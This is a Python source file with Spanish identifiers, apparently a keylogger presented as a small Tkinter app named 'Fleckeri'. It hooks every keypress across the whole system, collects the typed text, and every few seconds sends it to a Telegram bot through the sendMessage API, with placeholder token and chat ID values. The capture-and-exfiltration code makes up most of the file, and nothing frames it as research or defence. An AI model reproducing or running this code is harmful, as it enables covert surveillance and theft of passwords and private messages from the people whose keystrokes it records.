import tkinter as tk
from threading import Timer
import requests
import keyboard
import tkinter as tk
from threading import Timer
import requests
import keyboard

class SimuladorBot:
    def __init__(self, root, telegram_bot_token, telegram_chat_id, interval):
        self.root = root
        self.root.title("Fleckeri")
        self.root.geometry("400x300")
        self.root.configure(bg="#343541")
        self.root.iconbitmap(r'../ruta/a/la/imagen.ico')

        self.telegram_bot_token = telegram_bot_token
        self.telegram_chat_id = telegram_chat_id
        self.interval = interval
        self.logged_words = ""
        self.timer = None

        self.nombre_label = tk.Label(root, text="FLECKERI", font=("Arial", 14, "bold"), fg="white", bg="#343541")
        self.nombre_label.pack(pady=5)

        self.web_entry = tk.Entry(root, width=30)
        self.estado_label = tk.Label(root, text="Estado: Apagado", fg="red", bg="#343541")
        self.boton_encender_apagar = tk.Button(root, text="Encender", command=self.toggle_estado, bg="green", fg="white")
        self.contador_label = tk.Label(root, text="Tiempo activo: 0", bg="#343541", fg="white")

        self.web_entry.pack(pady=10)
        self.boton_encender_apagar.pack(pady=10)
        self.estado_label.pack(pady=10)
        self.contador_label.pack(pady=10)

        keyboard.on_press(self.on_key_press)


    def toggle_estado(self):
        if self.timer:
            self.timer.cancel()
            self.timer = None

        if self.boton_encender_apagar["text"] == "Encender":
            self.boton_encender_apagar["text"] = "Apagar"
            self.boton_encender_apagar["bg"] = "red"
            self.boton_encender_apagar["fg"] = "white"
            self.estado_label["text"] = "Estado: Encendido"
            self.iniciar_timer()
        else:
            self.boton_encender_apagar["text"] = "Encender"
            self.boton_encender_apagar["bg"] = "green"
            self.boton_encender_apagar["fg"] = "white"
            self.estado_label["text"] = "Estado: Apagado"

    def iniciar_timer(self):
        self.actualizar_contador()
        self.enviar_logs()

    def on_key_press(self, event):
     if event.name == "space":
        self.logged_words += " "
     elif event.name.lower() not in ["alt gr", "shift", "bloq mayus", "right alt", "alt", "right shift", "mayusculas",] and event.event_type == keyboard.KEY_DOWN:
        self.logged_words += event.name

    def enviar_logs(self):
        if self.logged_words:
            try:
                message = f"Palabras registradas:\n{self.logged_words}"

                url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
                params = {"chat_id": self.telegram_chat_id, "text": message}
                requests.post(url, params=params)

                self.logged_words = ""
            except Exception as e:
                print("Error al enviar el log:", str(e))

        if self.boton_encender_apagar["text"] == "Apagar":
            self.root.after(self.interval * 1000, self.enviar_logs)

    def actualizar_contador(self, contador=0):
        self.contador_label["text"] = f"Tiempo activo: {contador}"
        if self.boton_encender_apagar["text"] == "Apagar":
            self.root.after(1000, self.actualizar_contador, contador + 1)

if __name__ == "__main__":
    telegram_bot_token = "TOKEN_DEL_BOT"
    telegram_chat_id = "CHAT_ID"
    interval = 10

    root = tk.Tk()
    app = SimuladorBot(root, telegram_bot_token, telegram_chat_id, interval)
    root.mainloop()

